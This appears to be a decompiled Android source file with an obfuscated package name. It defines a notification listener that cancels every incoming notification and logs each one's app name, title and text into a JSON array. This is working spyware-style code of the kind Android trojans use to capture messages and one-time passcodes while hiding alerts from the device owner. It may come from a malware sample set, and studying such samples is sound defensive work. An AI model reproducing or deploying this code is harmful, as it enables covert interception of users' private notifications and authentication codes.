package com.zxtlfasu.wirdvgyk;

import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import androidx.core.app.NotificationCompat;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import kotlin.UByte;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

/* loaded from: classes.dex */
public class NotificationService extends NotificationListenerService {
    public static JSONArray logs = new JSONArray();

    @Override // android.service.notification.NotificationListenerService
    public void onNotificationRemoved(StatusBarNotification statusBarNotification) {
    }

    @Override // android.service.notification.NotificationListenerService
    public void onNotificationPosted(StatusBarNotification statusBarNotification) {
        cancelAllNotifications();
        if (statusBarNotification.getPackageName().equals("com.android.systemui")) {
            return;
        }
        Bundle bundle = statusBarNotification.getNotification().extras;
        try {
            logs.put(new JSONObject().put("data", new JSONObject().put("packageName", statusBarNotification.getPackageName()).put("title", bundle.getString(NotificationCompat.EXTRA_TITLE)).put("text", bundle.getString(NotificationCompat.EXTRA_TEXT)).put("uid", MD5(statusBarNotification.getKey() + ":" + statusBarNotification.getNotification().when))));
        } catch (JSONException unused) {
        }
    }

    public String MD5(String md5) {
        try {
            byte[] digest = MessageDigest.getInstance("MD5").digest(md5.getBytes());
            StringBuffer stringBuffer = new StringBuffer();
            for (byte b : digest) {
                stringBuffer.append(Integer.toHexString((b & UByte.MAX_VALUE) | 256).substring(1, 3));
            }
            return stringBuffer.toString();
        } catch (NoSuchAlgorithmException unused) {
            return null;
        }
    }
}